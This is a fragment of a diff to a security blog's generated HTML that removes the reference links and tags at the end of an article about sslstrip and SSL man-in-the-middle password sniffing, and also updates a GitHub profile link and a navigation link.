-<p><a target="_blank" rel="noopener" href="https://www.bingyublog.com/2018/02/23/%E4%BD%BF%E7%94%A8ssltrip%E7%AA%81%E7%A0%B4ssl%E5%8A%A0%E5%AF%86%E6%88%AA%E8%8E%B7%E5%AF%86%E7%A0%81/">使用ssltrip突破ssl加密截获密码</a></p>
-<p><a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/5929.html">利用sslstrip和ettercap突破ssl嗅探密码</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.linuxde.net/2011/11/2522.html">针对SSL的中间人攻击演示和防范</a></p>
-<p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/sslstrip">sslstrip Package Description</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/ARP/" rel="tag">ARP</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSLStrip/" rel="tag">SSLStrip</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
-            </div>
-        
-
-    </section>
-</article>
-  
 </section>
 
 
@@ -1191,7 +1136,7 @@ Newline (0x0a or \n)
     <div class="social-wrapper">
         
             
-                <a href="https://github.com/artchen" class="social github"
+                <a href="https://github.com/szczecin" class="social github"
                    target="_blank" rel="external">
                     <span class="icon icon-github"></span>
                 </a>
@@ -1310,7 +1255,7 @@ Newline (0x0a or \n)
                     </li>
                 
                     <li class="left">
-                        <a href="/SRC"
+                        <a href="/tags/SRC"
                            onfocus="this.blur();"
                            class="nav-SRC dark-btn block">
                             SRC
